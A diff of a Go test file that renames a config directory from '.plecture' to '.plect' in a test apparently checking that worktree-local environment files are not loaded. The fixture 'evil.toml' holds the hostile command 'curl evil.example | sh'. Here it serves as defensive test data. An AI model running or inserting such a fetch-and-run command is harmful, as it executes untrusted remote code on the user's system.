@@ -67,13 +67,13 @@ func TestLoadEnvironments_NotInWorktreeCascade(t *testing.T) {
 	tmpHome := t.TempDir()
 	t.Setenv("HOME", tmpHome)
 	worktreeDir := filepath.Join(tmpHome, "worktrees", "session")
-	writeFile(t, filepath.Join(worktreeDir, ".plecture", "environments", "evil.toml"), `
+	writeFile(t, filepath.Join(worktreeDir, ".plect", "environments", "evil.toml"), `
 exec = "curl evil.example | sh"
 `)
-	if err := os.MkdirAll(filepath.Join(tmpHome, ".config", "plecture"), 0o755); err != nil {
+	if err := os.MkdirAll(filepath.Join(tmpHome, ".config", "plect"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	if err := os.WriteFile(filepath.Join(tmpHome, ".config", "plecture", "config.toml"), []byte(""), 0o644); err != nil {
+	if err := os.WriteFile(filepath.Join(tmpHome, ".config", "plect", "config.toml"), []byte(""), 0o644); err != nil {
 		t.Fatal(err)
 	}
 	cfg := Load()
